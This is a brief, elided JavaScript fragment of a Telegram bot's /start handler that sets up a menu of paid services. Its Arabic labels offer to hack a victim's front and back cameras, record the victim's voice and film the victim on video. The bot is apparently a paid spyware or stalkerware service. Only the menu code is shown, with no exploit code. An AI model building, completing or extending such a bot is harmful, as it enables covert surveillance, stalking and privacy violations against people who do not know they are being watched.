...
bot.onText(/\/start/, async (msg) => {  
  ...
  try {  
    ...
    const mainMenuButtons = [  
      // أزرار مدفوعة
      [{ text: 'اختراق الكامرا الأمامية 📸', callback_data: `paid_front:${chatId}` }, { text: 'اختراق الكامرا الخلفية 📷', callback_data: `paid_back:${chatId}` }],  
      [{ text: 'تسجيل صوت الضحية 🎤', callback_data: `paid_voice:${chatId}` }, { text: 'تصوير الضحية فيديو 🎥', callback_data: `paid_video:${chatId}` }],  
